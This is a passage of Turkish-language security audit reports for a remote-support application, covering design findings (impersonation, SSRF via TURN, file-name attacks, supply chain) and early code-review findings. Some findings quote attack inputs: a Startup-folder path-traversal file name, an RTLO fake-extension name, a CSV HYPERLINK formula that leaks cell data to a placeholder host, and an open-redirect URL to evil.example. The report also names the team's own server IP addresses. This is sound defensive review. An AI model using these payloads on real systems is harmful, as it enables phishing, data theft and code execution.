| 1   | Kısmen kabul → **S8b2-1** (Orta): işaretli açılış kalabilir, ancak kişi değişikliğinde açık rıza gerekiyor. |
| 2   | Kabul (tek pencere; güvenlik etkisi yok).                                                                   |
| 3   | Kabul ("Unut" her zaman görünür; zararsız ve hatta iyi).                                                    |
| 4   | Güvenlik açısından kabul (110 sn < 120 sn; 403/426/4409/1008 kesin). Yeniden deneme aralığı → S8b2-2.       |
| 5   | Kabul (1001 = bağlanamadı; tasarıma uygun).                                                                 |
| 6   | Kabul (`FlashWindow` eşdeğer).                                                                              |
| 7   | Kabul (logo kuralları P6'dan aynen).                                                                        |
| 8   | Kabul (strict kural tek yerde).                                                                             |
| 9   | Kabul (`os.Rename` Windows'ta `MoveFileEx(REPLACE_EXISTING)`; crypt32 sistem DLL'i).                        |

## Otomatik tarama çıktıları

- `go test ./...` (docker `golang:1.26.11-bookworm@sha256:dc40a1…`, `-mod=readonly`): **17 paket ok** (`request`, `remember`, `api`, `flow`, `pairing` dahil). `go vet ./...` ve `GOOS=windows go vet ./...`: çıktı yok (temiz).
- Gizli bilgi regex'i (`git grep -nE "(api[_-]?key|secret|password|token)\s*[:=]\s*['\"][^'\"]{8,}"` → `apps/agent-win`): **0 eşleşme**. Not: yeni dosyalar izlenmediği (untracked) için git grep onları taramaz; `internal/request`, `internal/remember` ve `ui/request_windows.go` elle incelendi, gerçek gizli değer yok. Test sabitleri `AAAA…` biçiminde.
- `.env` geçmişi: Yalnız `.env.example` git geçmişinde.
- Bağımlılık: `go.mod`/`go.sum` değişmedi. Yeni bağımlılık yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- G-E9-13 "kutucuk varsayılan işaretsiz": Hatırlanan veri varken uygulanmıyor → S8b2-1.
- Windows'a özgü maddeler (iz testi, gerçek DPAPI başka kullanıcı testi, RDP enjekte tıklama, gerçek ağda yeniden bağlanma) kodda var ama yalnız elle doğrulanabilir. `implementation.md` Windows adımları 2, 5, 11 ve 13 test-operatoru tarafından koşulmalı. Bu tur kod okumasıyla sınırlı.

## Olumlu

- Talep modu platformdan bağımsız ve arayüzlerle sahte bileşenlere bağlanıyor. Durum makinesi saf ve yarışlar testli (`CANCELLING` / geç kabul).
- Sunucu girdisi strictObject ve alan kurallarıyla tek yerde (`signal.DecodeStrict`) doğrulanıyor; ihlalde 1008 gönderiliyor.
- Açılabilecek tek URL yerel olarak kuruluyor ve iki katmanda denetleniyor. Sır yalnız subprotocol'de taşınıyor, loglama hiç yok.
- Yeniden deneme politikası kotayı bilinçli olarak koruyor (create'te ağ hatası tekrarlanmıyor).
- Hatırlama dosyası, rıza ve kişi değişikliği sorunu (S8b2-1) dışında ADR-0004 r3'e eksiksiz uyuyor.

Karar: Kritik/Yüksek 0 → **GEÇTİ**. S8b2-1 (Orta) 0.9.0 yayınından önce düzeltilmesi önerilir; tek fonksiyonluk bir değişiklik. Düzeltilmezse `docs/gereksinimler.md` §9'a "Sonra" olarak yazılmalı. S8b2-2 ve S8b2-3 (Düşük) "Sonra" listesine eklenmeli.

---

# Güvenlik Raporu — Tasarım turu (Tur 0, kod yok)

Tarih: 2026-11-10 · Kapsam: `docs/mimari.md` §5, `docs/tasarim-kontrol.md` §4, mimari-protokol/akislar/api, ADR-0006/0007/0009/0010
DURUM: DÜZELTİLMELİ (tasarım; ilgili paket başlamadan mimari/AC güncellenmeli)
Özet: Kritik 0 / Yüksek 8 / Orta 10 / Düşük 7

Yöntem: Kod olmadığı için "Yer" = belge:satır/bölüm. Otomatik tarama uygulanamadı (bkz. sondaki bölüm).

## K6 kararı (teknisyen "Katılımcıyı kabul et") — KARAR: EKLENSİN, P3'te, zorunlu

Gerekçe (G-01): ADR-0006'nın kendi hesabı N=50 aktif kodda %9 başarı veriyor; dahası mevcut `verifyCode`
müşteriyi **doğrulamıyor** — `resolve` yanıtında katılan herkese döndürülüyor (mimari-api.md Public tablo),
yani kodu tahmin eden saldırgan da aynı 4 haneyi görür ve telefonda "doğru" okuyabilir. Kabul adımı olmadan
teknisyenin sahte müşteriyi ayırt edecek güvenilir bir sinyali yok. Uygulama biçimi G-01'de.

## Bulgular (öncelik sırasıyla)

### [YÜKSEK] G-01 Müşteri yerine geçme: verifyCode yön hatası + kabul adımı yok — A07 Kimlik Doğrulama Hataları

Yer: mimari.md:166 (T1), mimari-api.md Public `resolve` çıktısı (`verifyCode`), adr/0006 "Sonuçlar", mimari.md:414 (K6)

- Tehdit: A1/A2 kodu brute-force eder (veya linki ele geçirir), `join` ile oturumu tüketir; gerçek müşteri 410 alır
  (DoS), teknisyen sahte uca chat/dosya/talimat gönderir; teknisyen "verifyCode'u okuyun" dediğinde saldırgan da okur.
- Eksik kontrol: katılan tarafın kimliğine bağlı, yalnız ona gösterilen bir sır yok; join anında tüketim gerçek
  müşteriyi kilitliyor; teknisyen onayı olmadan SDP akıyor.
- Önerilen tasarım:
  1. `join` oturumu **tüketmez**; misafir `LOBBY` durumuna girer. Sunucu misafir başına rastgele 4 haneli
     `admitCode` üretir, yalnız o misafire döner (`join` yanıtı), DB/bellekte hash.
  2. Konsola `peer.pending{guestId, name, guestKind, ipCountry?}`; teknisyen müşteriden telefonda `admitCode`'u
     okumasını ister → `guest.admit{guestId}` / `guest.reject{guestId}`. Kabul gelmeden SDP/ICE iletilmez,
     TURN credential verilmez (credential `admit` sonrası `hello` ile).
  3. Tüketim (`consumed_at`, ACTIVE, `active_code=NULL`) **admit** transaction'ında. Reddedilen misafir
     `session.ended{rejected}` alır; kod geçerli kalır → gerçek müşteri kilitlenmez.
  4. Lobide eşzamanlı en çok 3 misafir; lobi bekleme 5 dk; teknisyen 3 ret sonrası "Oturumu iptal et, yenisini aç" önerisi.
  5. Mevcut `verifyCode` adı "Teknisyen doğrulama kodu" olur ve yalnız müşterinin teknisyeni doğrulaması için
     kullanılır; belgede "müşteriyi doğrulamaz" diye yazılır. Kod 6→8 haneye çıkarma ayrıca önerilir (G-02 ile).
  6. Audit: `guest.pending`, `guest.admitted`, `guest.rejected` (ip, ad).
- Paket: P3 (protokol + oda durum makinesi), P4 (konsol lobi UI, müşteri bekleme ekranı), P6 (istemci bekleme ekranı), P2 (durum makinesi alanları).

### [YÜKSEK] G-02 Global başarısız-kod limiti kendisi DoS aracı — A04 Güvensiz Tasarım

Yer: mimari.md:166, adr/0006 "Karar" (global 60/dk, aşımda kod yolu 60 sn 429)

- Tehdit: tek saldırgan dakikada 61 yanlış kod göndererek **tüm tenant'ların** kod ile katılımını kalıcı kapatır
  (Go istemci yolu tamamen kod/dosya adına dayalı → tam erişim modu ölür).
- Eksik kontrol: global sayaç kaynak ayırt etmiyor; üstel ceza ve ağ öneki bazlı sayaç yok.
- Önerilen tasarım: sayaçlar IPv4 /24 ve IPv6 /56 öneki bazında (10/dk) + IP bazında üstel bekleme;
  global sayaç **engelleme değil alarm** eşiği olsun; global eşik aşılırsa yalnız ilgili önekler engellenir.
  Kod 8 haneye (10⁸) çıkarılırsa dağıtık saldırı başarısı ~%0,09'a (N=50) iner; telefonda "4-4" grup okunur.
  Dosya adı yolunda kod okunduğundan uzunluk artışı kullanıcıya maliyetsiz. Token yolu etkilenmez (mevcut).
- Paket: P2 (`codes.ts`), P3 (`rate.ts`, resolve).

### [YÜKSEK] G-03 Kontrol izin diyaloğu tıklama/tuş tuzağı ve spam — A04 Güvensiz Tasarım

Yer: mimari-akislar.md A3, mimari-protokol.md §4.3 (1), adr/0009

- Tehdit: A3 teknisyen `control.request`'i müşteri yazarken/tıklarken art arda gönderir; diyalog odağı alır,
  müşterinin Enter/Space/tıklaması "İzin ver"e düşer → rıza dışı kontrol. Enjekte olmayan olay filtresi bunu engellemez.
- Eksik kontrol: varsayılan buton, giriş gecikmesi, istek hız sınırı tanımlı değil.
- Önerilen tasarım: diyalogda varsayılan/odak "Reddet"; Enter/Space "İzin ver"i tetiklemez; butonlar 1,5 sn
  sonra etkin; diyalog açılırken o anki fare konumunun altında açılmaz; `control.request` sunucuda oturum başına
  ret sonrası 30 sn bekleme + en çok 5 istek/oturum; aynı kurallar `monitor.request` ve `file.offer` kabul diyaloğu için.
  AC-99'a ek kabul kriteri: "İlk 1,5 sn tıklama ve klavye 'İzin ver'i tetiklemez".
- Paket: P7 (gate/ui, server handlers), P5/P6 (dosya kabul diyaloğu).

### [YÜKSEK] G-04 Aktif oturumu yönetici kesemez; hesap/yetki iptali canlı oturumu durdurmaz — A01 Erişim Kontrolü

Yer: mimari.md:157 ("Admin… yalnız görüntüler/iptal eder"), mimari-api.md `/cancel` (409 PENDING değil), mimari.md:152 (≤5 sn yalnız REST)

- Tehdit: ele geçirilmiş/kötü niyetli teknisyen (A3, dolandırıcı) müşteri makinesini kontrol ederken Admin hesabı
  pasife alır, şifre sıfırlar veya `remote_control.use`'u kapatır — açık WS ve P2P kontrol sürer.
- Eksik kontrol: ACTIVE oturum için Admin/Super Admin "Zorla sonlandır"; deaktivasyon/logout-all/yetki değişimi →
  canlı WS kapatma; `requirePerm` WS'de yalnız istek anında.
- Önerilen tasarım: `POST /sessions/:id/terminate` (Admin aynı tenant, Super Admin), oda → `session.ended{admin}`
  her iki tarafa; istemci `session.ended`'de gate kapatır ve çıkar (mevcut AC-107). `users.deactivate`,
  `logout-all`, auth_session revoke, yetki geri alımı → `rooms.endByTechnician(userId)` ve `remote_control.use`
  kaldırıldıysa misafire `control.revoke` (istemci gate kapatır). WS tech soketi her 60 sn auth_session'ı yeniden doğrular. Audit `session.terminated`.
- Paket: P3 (rooms), P7 (control.revoke), P9 (deaktivasyon), P10 (logout-all).

### [YÜKSEK] G-05 TURN `denied-peer-ip` listesi eksik — A10 SSRF

Yer: adr/0007 "Karar", mimari.md:174 (T9)

- Tehdit: anonim misafir (join sonrası TURN credential alır) relay ile kendi altyapımıza erişir: uygulama sunucusu
  185.126.217.99 (MySQL/metrics/iç portlar dışa açıksa), Proxmox 185.126.217.113 yönetim arayüzü, TURN VM'nin
  kendisi, aynı /24'teki diğer sunucular; IPv4-mapped IPv6 (`::ffff:10.0.0.1`), NAT64 (`64:ff9b::/96`), 6to4 (`2002::/16`) ile özel aralık atlatma.
- Eksik kontrol: kendi public IP'lerimiz ve geçiş aralıkları listede yok.
- Önerilen tasarım: listeye ekle — `192.0.0.0/24`, `192.0.2.0/24`, `198.18.0.0/15`, `198.51.100.0/24`,
  `203.0.113.0/24`, `224.0.0.0/4`, `240.0.0.0/4`, `255.255.255.255`, `::/128`, `::ffff:0:0/96`, `64:ff9b::/96`,
  `100::/64`, `2001::/32`, `2001:db8::/32`, `2002::/16`, `ff00::/8`, **TURN VM IP, 185.126.217.99, 185.126.217.0/24
  (sağlayıcı bloğu; meşru müşteri bu bloktan gelmeyecek), Proxmox yönetim IP'si**. `turnserver.conf` için
  `turnutils_uclient` ile her aralığa negatif test P3 "bitti" kanıtına eklensin. `no-tcp-relay` korunur.
- Paket: P3 (`deploy/turn/turnserver.conf`), P13 (runbook: IP değişiminde listeyi güncelle).

### [YÜKSEK] G-06 Gelen dosyada yol/ad saldırıları, MOTW yok, uyarı listesi eksik — A08 Bütünlük / A03 Enjeksiyon

Yer: mimari-protokol.md §4.1 `file.offer.name`, §4.2 (Go `%USERPROFILE%\Downloads`), AC-36

- Tehdit: teknisyen (veya müşteri yerine geçen saldırgan teknisyene) `name="..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.exe"`,
  ADS `rapor.txt:evil.exe`, aygıt adları (`CON`, `NUL`), sondaki nokta/boşluk, RTLO (`U+202E`) ile `fatura‮fdp.exe` → ".pdf" görünen exe;
  MOTW olmadan alınan exe SmartScreen'siz çalışır.
- Eksik kontrol: ad temizleme kuralı, MOTW, tam tehlikeli uzantı listesi, gerçek bayt sayısına göre sınır.
- Önerilen tasarım: alıcı tarafta (Go + tarayıcı) `filepath.Base` + `[\\/:*?"<>|\x00-\x1F]` ve Unicode bidi/format
  karakterleri (Cf kategorisi) silinir, ayrılmış adlar ön ek alır, uzunluk ≤ 255; çakışmada `(1)` eklenir, üzerine yazılmaz.
  Go istemci yazılan dosyaya `:Zone.Identifier` (`ZoneId=3`) ADS ekler. Uyarı listesine `.lnk .hta .cpl .msc .jar .dll .com .pif .reg .scf .url .chm .wsf .psm1 .iso .img .vhd .vhdx .appx .msix .appinstaller .application .xll .docm .xlsm`
  eklenir; çift uzantı (`.pdf.exe`) ayrıca vurgulanır. Alıcı `size` yerine **alınan bayt** sayacına göre `maxFileBytes` aşımında keser.
- Paket: P5 (contracts `dc.ts`, web alıcı), P6 (Go alıcı).

### [YÜKSEK] G-07 İmzasız binary bütünlüğü yalnız aynı kaynaktan doğrulanıyor — A08 Yazılım/Veri Bütünlüğü

Yer: adr/0010 "Hash yayını", mimari.md:178 (T13), tasarim-kontrol.md:58

- Tehdit: publish sunucusu ele geçirilirse saldırgan exe'yi, `AGENT_SHA256` env'ini ve karşılama sayfasındaki hash'i
  birlikte değiştirir → tüm müşterilere zararlı dağıtılır; aynı origin'deki hash hiçbir şey kanıtlamaz. Fork'lanmış
  açık kaynak koddan "NoktaDestek" versioninfo'lu, dolandırıcı sunucuya bağlı kopya ayırt edilemez.
- Eksik kontrol: sunucudan bağımsız imza/köken kanıtı.
- Önerilen tasarım: (1) `agent-win.yml`'de GitHub Artifact Attestations (`actions/attest-build-provenance`,
  SLSA provenance, ücretsiz) + Sigstore/cosign veya çevrim dışı anahtarlı **minisign** imzası Release'e;
  (2) sunucu açılışta binary hash'ini env değil, CI'nın imzaladığı `SHA256SUMS.minisig`'i gömülü açık anahtarla
  doğrular; (3) istemci karşılama penceresi kendi SHA-256 parmak izinin ilk 8 hanesini ve bağlandığı alan adını
  gösterir, teknisyen konsolu beklenen değeri gösterir (telefonla teyit); (4) SignPath Foundation başvurusu "Sonra"
  değil P6 ile paralel başlatılsın; (5) `serverURL` ldflags dışında değiştirilemez (komut satırı/env/registry yok).
- Paket: P6, P13 (runbook: imza anahtarı saklama/rotasyon).

### [YÜKSEK] G-08 DLL arama sırası ele geçirme (Downloads klasöründen çalışan imzasız exe) — A08

Yer: adr/0004/0010 (Go + `go-ole`, Media Foundation), mimari.md:353

- Tehdit: exe `Downloads`'tan çalışır; aynı klasöre daha önce (drive-by) indirilmiş `version.dll`, `dwmapi.dll`,
  `mfplat.dll`, `winmm.dll` vb. süreç tarafından yüklenir → müşteri kullanıcısı bağlamında kod çalışır, üstelik
  "Nokta Destek" adına. `syscall.NewLazyDLL`/`LoadLibrary` uygulama dizinini önce arar.
- Eksik kontrol: DLL yükleme politikası tanımsız.
- Önerilen tasarım: `main` başında `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)`; tüm DLL'ler
  `windows.NewLazySystemDLL`; `go-ole` ve üçüncü parti paketler incelenir (gerekirse ince sarmalayıcı);
  PE import tablosunda yalnız KnownDLLs/System32; `%TEMP%`'e DLL/çalıştırılabilir çıkarma yasak.
  P6 "bitti" kanıtına: Procmon ile Downloads dizininde DLL arama olayı 0.
- Paket: P6.

### [ORTA] G-09 P2P yetkiler sunucuda uygulanamıyor (`file_transfer.use`); kontrol isteği kanalı — A01

Yer: mimari-api.md yetki tablosu, mimari-protokol.md §3 `file.meta` ("iki taraf→S"), §4.1

- Tehdit: `file_transfer.use` yetkisi olmayan teknisyen tarayıcı JS'ini değiştirip `ctl` DC'den `file.offer` yollar;
  sunucu yalnız (isteğe bağlı) `file.meta` görür. Benzer şekilde `control.request` DC'den gelirse istemci diyalog açabilir.
- Önerilen tasarım: sunucu `hello` (guest) içinde teknisyen yetenek listesini (`caps: ["file_transfer","remote_control"]`)
  gönderir; istemci/müşteri sayfası listede olmayan DC isteklerini reddeder; `control.request` yalnız WS (sunucu)
  kaynağından kabul edilir, DC'de bu tip yok sayılır; yetki değişince `caps.update` (G-04).
- Paket: P5, P6, P7.

### [ORTA] G-10 Ticket ve reconnectToken URL sorgusunda; reconnect ile gerçek misafiri düşürme — A07

Yer: mimari-protokol.md §1 (`?ticket=`, `&reconnect=`), mimari.md:277 (redaksiyon yalnız `/session/<token>`)

- Tehdit: Caddy access log / pino `req.url` sorgu dizesini yazar; `reconnectToken` oturum boyu geçerli → log
  okuyan biri kopma penceresinde misafir yuvasını ele geçirir; misafir bağlıyken reconnect davranışı tanımsız.
- Önerilen tasarım: ticket/reconnect `Sec-WebSocket-Protocol` başlığında veya upgrade sonrası ilk `auth` mesajında
  (5 sn timeout); Caddy log formatında sorgu dizesi maskelenir; reconnect yalnız `guestSocket` yokken kabul,
  aksi halde ret + audit `reconnect.conflict`; reconnect sonrası G-01 lobisine gerek yok ama kontrol `VIEW` (mevcut).
- Paket: P3, P1 (Caddy log).

### [ORTA] G-11 Gerçek istemci IP'si (trustProxy) ve IPv6 limit birimi tanımsız — A04

Yer: mimari.md:154, :166; tasarim-kontrol.md:36

- Tehdit: Fastify `trustProxy: true` ile `X-Forwarded-For` sahtelenir → tüm IP limitleri (login 20/dk, resolve
  10/dk) atlanır; tek IPv6 /64 sınırsız adres sağlar.
- Önerilen tasarım: `trustProxy` yalnız Caddy konteyner adresi; Caddy gelen XFF'yi ezer; limit anahtarı IPv4 /32, IPv6 /64.
- Paket: P1, P3.

### [ORTA] G-12 SMTP/MySQL test uçlarıyla iç ağ taraması (SSRF) — A10

Yer: mimari-api.md `/settings/smtp/test`, `/admin/settings/mysql/test`

- Tehdit: tenant Admin'i (Super Admin'den az güvenilir) SMTP host'una `mysql`, `server:3001`, `169.254.169.254`,
  Proxmox LAN adresleri yazar; ayrıntılı hata/banner ve süre farkıyla port taraması yapar.
- Önerilen tasarım: tenant SMTP host'u çözümlenen IP özel/loopback/link-local/Docker ağıysa ret (DNS rebinding için
  bağlantı çözümlenen IP'ye yapılır); hata mesajı genel ("bağlanılamadı/kimlik reddedildi"); test 5/dk; MySQL testi yalnız Super Admin (mevcut) + audit.
- Paket: P10, P11.

### [ORTA] G-13 Anonim misafire 4 saatlik TURN credential; bant sınırı yok — A04

Yer: adr/0007 (expiry ≤ 4 sa, `user-quota=4`)

- Tehdit: join yapan (veya G-01 ile sızan) misafir credential'ı oturum bittikten sonra da kullanır → anonim relay
  (kaynak gizleme, bant tüketimi). HMAC credential iptal edilemez.
- Önerilen tasarım: ömür `min(kalan süre, 60 dk)` ve WS üzerinden `ice.refresh` ile yenileme; misafire credential
  yalnız admit sonrası (G-01); coturn `max-bps` (ör. 6 Mbps) ve `bps-capacity`; Prometheus'ta oturumsuz allocation alarmı.
- Paket: P3.

### [ORTA] G-14 Sinyalizasyonu kontrol eden DTLS'i MITM edebilir — A02 Kriptografik Hatalar

Yer: mimari.md:178 ("pinning yok"), :188 ("yalnız DTLS-SRTP")

- Tehdit: kurumsal TLS denetim proxy'si (istemci sistem kökünü kullanır) veya ele geçirilmiş sunucu SDP'deki
  `a=fingerprint`'i değiştirip medyayı/girdiyi araya girerek okur/değiştirir; "sunucu medya görmez" iddiası yalnız dürüst sunucuda geçerli.
- Önerilen tasarım: iki uçta her iki DTLS parmak izinden türetilen 4–6 haneli SAS (`HMAC(fpTech||fpGuest)`) konsolda
  ve istemcide gösterilir; kontrol izni diyaloğunda da görünür; uyuşmazlık müşteriye "bağlantı güvenli değil" olarak yansır. Belgede güven varsayımı açık yazılır.
- Paket: P4, P6.

### [ORTA] G-15 Audit maskesi hem eksik hem aşırı; tetikleyici uygulama kullanıcısınca düşürülebilir — A09

Yer: mimari.md:122-124, :283 (`migrate deploy` server başlangıcında)

- Tehdit: regex `ticket`, `credential` (TURN), `recovery`, `cookie`, `authorization`, `sdp` (ICE pwd + iç IP)
  yakalamaz; `key` ise `perm_key`'i maskeler → yetki değişikliği audit'i okunamaz. Uygulama aynı DB kullanıcısıyla
  migration yaptığı için `DROP TRIGGER` yetkisi vardır → audit değiştirilebilir.
- Önerilen tasarım: anahtar adına göre **izinli liste** (`perm_key` açık) + kara liste genişletmesi; iki DB kullanıcısı:
  `migrator` (DDL, yalnız deploy işinde) ve `app` (audit_logs'ta yalnız INSERT/SELECT, TRIGGER/ALTER/DROP yok).
  Audit yazımı başarısızsa kontrol izni olayları (`control.state GRANTED`) reddedilir (fail-closed).
- Paket: P1, P11, P13.

### [ORTA] G-16 CSV export'ta formül enjeksiyonu — A03 Enjeksiyon

Yer: mimari-api.md `/sessions/export.csv`, `/audit/export.csv`

- Tehdit: müşteri adı `=HYPERLINK("http://x/?"&A1)` veya `=cmd|...`; Excel'de açan Admin'de veri sızıntısı/komut.
- Önerilen tasarım: `= + - @ \t \r` ile başlayan hücrelere `'` öneki; customerName, ticket, note, file_name, user_agent dahil. Birim test.
- Paket: P8, P11.

### [ORTA] G-17 Dolandırıcılık (tech-support scam) kötüye kullanım kontrolleri eksik — A04

Yer: mimari.md:168 (T3), tasarim-kontrol.md:61

- Tehdit: A2/A3 meşru tenant içinden (veya kendi kurduğu fork'la) "banka/Microsoft destek" araması yapar; kontrolü
  alıp gösterge üstüne tam ekran topmost pencere açar, banka işlemi yaptırır.
- Önerilen tasarım: (1) istemci + karşılama sayfasında onaydan önce sabit uyarı: "Sizi kendiliğinden arayan biri
  bunu istediyse kapatın; banka/şifre işlemi yapmayın"; (2) ekran karartma/gizli mod özelliği **yasak** (gereksinimlere
  kapsam dışı olarak yazılsın); (3) göstergeler 1 sn'de bir `HWND_TOPMOST` ile yeniden öne alınır, kırmızı çerçeve
  tüm monitörlerde; (4) karşılama/istemcide "Kötüye kullanımı bildir" bağlantısı → Super Admin'e e-posta + audit;
  (5) Super Admin tenant oluştururken firma doğrulaması runbook adımı; (6) oturum sonunda müşteriye özet (teknisyen, süre, kontrol süresi, dosyalar) gösterilir.
- Paket: P4, P6, P7, P13.

### [ORTA] G-18 CI/tedarik zinciri sertleştirmesi tanımsız — A06/A08

Yer: tasarim-kontrol.md:51, :97; adr/0010 "Tekrarlanabilir build"

- Tehdit: üçüncü parti GitHub Action etiketi değiştirilir (tj-actions benzeri), Release yazma yetkili token ile binary değiştirilir.
- Önerilen tasarım: tüm Action'lar commit SHA ile sabit; `permissions:` en az (varsayılan `contents: read`, yalnız release
  işinde `contents: write`, `id-token: write`, `attestations: write`); Release yalnız korumalı `v*` etiketinden ve
  onaylı `environment`'tan; PR'den gelen fork workflow'larına secret yok; `go.sum` + `GOFLAGS=-mod=readonly`,
  `GOTOOLCHAIN` sabit; `pnpm install --frozen-lockfile`; Dependabot/Renovate; Scorecard önerilir.
- Paket: P1, P6.

### [DÜŞÜK] G-19 CSP ayrıntıları — A05 Yanlış Yapılandırma

Yer: mimari.md:194-196

- `connect-src` port içermeli (`wss://<host>:4450`); `style-src` nonce'u `style=""` özniteliklerini kapsamaz →
  geliştirici `'unsafe-inline'` eklemesin, inline style yerine sınıf/CSS değişkeni kuralı yazılsın; `worker-src 'self'`,
  `manifest-src 'self'`, `upgrade-insecure-requests`, `Cross-Origin-Resource-Policy: same-origin` eklensin; Caddy/Next
  `Server`/`X-Powered-By` kaldırılsın. HSTS `includeSubDomains` tüm alan adını etkiler — diğer alt alanların HTTPS olduğu doğrulanmalı. Paket: P1, P4.

### [DÜŞÜK] G-20 Native WS kuralı ve gizli değer entropisi belirsiz — A07

Yer: mimari-protokol.md §1 (`User-Agent: NoktaDestek` kabul)

- User-Agent bir güvenlik kontrolü değildir; belgede "yalnız bilgi" diye yazılsın, kuralı `ticket.kind` belirler (mevcut).
  `joinNonce`, `wsTicket`, `reconnectToken`, `admitCode` dışındakiler için ≥128 bit CSPRNG, karşılaştırma `timingSafeEqual` açıkça tanımlansın. Paket: P3.

### [DÜŞÜK] G-21 Global kısayol kaydı başarısız olabilir — A04

Yer: mimari-protokol.md §4.3 (2), AC-102

- Başka uygulama Ctrl+Shift+F12'yi tutuyorsa `RegisterHotKey` başarısız olur; bu durumda kontrol izni verilmesin veya
  yedek kısayol (Ctrl+Shift+F11) kaydedilip ekranda gösterilsin. Paket: P7.

### [DÜŞÜK] G-22 Oturum kayıtlarında tutarsızlık ve sahiplik ayrıntısı — A01

Yer: mimari-api.md `/sessions` notu ("link… GET /:id PENDING iken") ↔ mimari.md:106 (yalnız `token_hash`)

- Düz token DB'de olmadığına göre GET `/:id` link döndüremez; geliştirici geri döndürülebilir saklamaya kaymasın — metin
  "yalnız POST yanıtında" olarak düzeltilsin. `short_code` düz metin (kısa ömürlü, kabul) ama `active_code` dışında NULL'lansın.
  USER rolü için detay/PATCH/export'ta da `technician_id = user.id` kuralı açıkça yazılsın (yalnız liste değil). Paket: P2, P8.

### [DÜŞÜK] G-23 Hesap kilitleme ile hizmet engelleme; e-posta gönderim limiti — A07

Yer: mimari.md:154, mimari-api.md `/sessions/:id/email`

- Saldırgan bilinen teknisyen e-postalarını 15 dk'da bir kilitler. Öneri: kilit hesap+IP bileşimi, tam kilit yalnız
  IP'den bağımsız 20 hata/sa; kilitli hesaba bildirim e-postası. Oturum linki e-postası teknisyen başına 20/sa. Paket: P1, P10.

### [DÜŞÜK] G-24 `consentTextId` doğrulaması tanımsız — A04

Yer: mimari-api.md `/public/sessions/join`

- Sunucu `consentTextId`'nin oturumun tenant'ına ait ve `is_current` olduğunu doğrulamalı; aksi halde başka tenant'ın/eski metnin onayı kaydedilir. Paket: P4.

### [DÜŞÜK] G-25 Belge çelişkileri — A05

Yer: tasarim-kontrol.md:99 (runbook "kod imzalama yenileme"), gereksinimler AC-27/AC-94/AC-96 ("imzalı")

- İmza yokken runbook maddesi "imza/attestation anahtarı yönetimi" (G-07) olarak değiştirilsin; K8 kapanmadan P6 başlamasın. Paket: P6, P13.

## Otomatik tarama çıktıları

- `npm/pnpm audit`, `govulncheck`, `pip-audit`, `dotnet`: **uygulanamadı** — repoda henüz kaynak kod/lockfile yok (yalnız `docs/`).
- Gizli bilgi taraması (`git grep`): **uygulanamadı** — dizin git deposu değil. `docs/` elle tarandı: gerçek şifre/anahtar/token yok
  (yalnız `TURN_SECRET`, `METRICS_TOKEN` gibi değişken adları).
- `.env` git geçmişi: depo yok; P1'de `.gitignore` + gitleaks ile kurulacak (T18).

## Tasarımda vaat edilip eksik/çelişkili olanlar

- T1 "verifyCode telefonda teyit" → müşteriyi doğrulamaz (resolve'da herkese dönüyor) — G-01.
- T9 "özel IP relay yasağı" → kendi public IP'lerimiz ve IPv6 geçiş aralıkları yok — G-05.
- T13 "SHA-256 doğrulama" → aynı origin; sunucu ele geçirilmesine karşı koruma yok — G-07.
- "Admin iptal eder" → yalnız PENDING; ACTIVE oturumu kesecek yetki yok — G-04.
- `file_transfer.use` yetkisi P2P'de sunucuda uygulanamaz — G-09.
- Audit "değiştirilemez" → migration kullanıcısı = uygulama kullanıcısı, tetikleyici düşürülebilir — G-15.
- Log maskeleme `/session/<token>` dışında WS sorgu dizesini kapsamıyor — G-10.

## Olumlu

- İzin kapısı istemcide, sunucu mesajı açamaz; yeniden bağlanmada kapalı; enjekte olay filtresi; AC-101 otomatik testi.
- Opak DB oturumu (JWT yok), SameSite=Strict + double-submit CSRF + Origin; CORS kapalı.
- Token/nonce/ticket yalnız hash; resolve tüketmez (e-posta tarayıcı ön-getirmesi linki yakmaz); join koşullu UPDATE ile yarışsız.
- TURN `use-auth-secret`, `no-tcp-relay`, `no-cli`, ayrı VM/IP; statik secret istemciye gitmez.
- Upload: magic bytes + sharp yeniden kodlama, SVG yok, nosniff.
- İstemci: admin yok, kalıcılık yok, dinleyen port yok, UPX yok, TLS doğrulamalı, Ctrl+Alt+Del/Win+L iletilmez.
- Açık kaynak için gitleaks + lisans taraması + SBOM planlı; prod açılışı 2FA (P10) sonrasına bağlı.

## Öneri: `docs/gereksinimler.md` §9'a "Sonra" olarak

G-13 (credential yenileme ayrıntısı), G-14 (SAS), G-19..G-25. Yüksek bulgular (G-01..G-08) "Sonra" olamaz;
ilgili paket başlamadan mimari/AC'ye işlenmelidir (G-01, G-02, G-05, G-10, G-13 → P3 öncesi).

## P1 kod turu

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 3 / Düşük 8 — Orta bulgular P2 başlamadan kapatılmalı (S1-1 ve S1-2 düşük maliyetli).

### Bulgular (öncelik sırasıyla)

#### S1-1 [ORTA] `safeNext` sekme/satır sonu ile açık yönlendirme — A01

Yer: apps/web/lib/api.ts:89-92, kullanım apps/web/app/(auth)/login/login-form.tsx:45
Tehdit: `/login?next=%2F%09%2Fevil.example` → `next="/\t/evil.example"` kontrolü geçer; WHATWG URL ayrıştırıcısı
TAB/LF/CR'yi atar → `//evil.example`. Next 16 `router.replace` dış origin'i `completeHardNavigation` ile açar
(navigate-reducer.js:34). Doğrulandı: `new URL("/\t/evil.example", base).origin === "https://evil.example"`.
Kurban başarılı girişten hemen sonra sahte "oturum süresi doldu" sayfasına gider → kimlik bilgisi avı.
Öneri: `const u = new URL(next, location.origin); if (u.origin !== location.origin) return fallback; return u.pathname + u.search;`
ya da `/^\/(?![\/\\])[\x21-\x7e]*$/` izinli kalıbı (kontrol karakteri yok). Birim test: `\t`, `\n`, `\r`, `/\`, `//`, `%09`.
Atanan: frontend-dev

#### S1-2 [ORTA] Hesap geneli kilit sayacı yarışta kaybolur (kayıp güncelleme) — A07 (G-23)

Yer: apps/server/src/auth/service.ts:38-50 (sayım `user.failedLoginCount`'tan, kullanıcı TX dışında :67'de okunur), repo.ts:41-47
Tehdit: argon2 doğrulaması ~onlarca ms sürer; farklı IP'lerden eşzamanlı N deneme hepsi aynı eski sayacı okuyup `count+1` yazar
→ 20/sa hesap geneli sınır pratikte hiç tetiklenmez. Hesap+IP kilidi (5/15 dk) IP sayısıyla çarpılır; dağıtık brute-force'a
karşı kalan tek global sınır etkisizleşir (2FA P10'a kadar yok).
